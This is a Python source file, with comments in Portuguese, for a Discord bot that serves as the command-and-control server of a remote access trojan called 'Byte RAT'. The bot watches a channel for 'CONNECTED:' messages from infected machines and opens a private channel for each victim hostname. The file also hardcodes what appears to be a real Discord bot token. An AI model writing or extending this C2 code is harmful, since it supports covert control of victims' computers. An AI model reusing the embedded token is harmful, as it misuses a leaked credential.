# Arquivo que vai conter a inicialização do bot
# Inicio: 28/04/25
# Ultima atualização: 28/04/25

import discord
from discord.ext import commands

# Token aqui mesmo por enquanto
TOKEN='MTM2NjQ2MTcwMTg0NjcyODgwNQ.GmXVk1.Z11MMSsvVkkczYpDgrf7E7_5v04MO6TlGRyB08'
GUILD_ID=1366462091954880564
CANAL_INICIAL_ID=1366462825253437551

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = commands.Bot(command_prefix='/', intents=intents)

@bot.event
async def on_ready():
    print(f"bot conectado com {bot.user}")

@bot.command
async def hello(ctx):
    await ctx.send('Byte RAT Online')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if message.channel.id == CANAL_INICIAL_ID:
        if message.content.startswith('CONNECTED:'):
            hostname = message.content[10:].strip().lower().replace(' ', '-')

            guild = bot.get_guild(GUILD_ID)

            existing_channel = discord.utils.get(guild.text_channels, name=hostname.lower())
            if existing_channel:
                await message.channel.send(f"[!] canal chamado {hostname} já existe")
                return

            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            channel = await guild.create_text_channel(hostname, overwrites=overwrites)
            await channel.send(f"[+] novo dispositivo conectado: {hostname}")

            await message.channel.send(f"[+] canal criado para {hostname}")

    await bot.process_commands(message)

bot.run(TOKEN) 
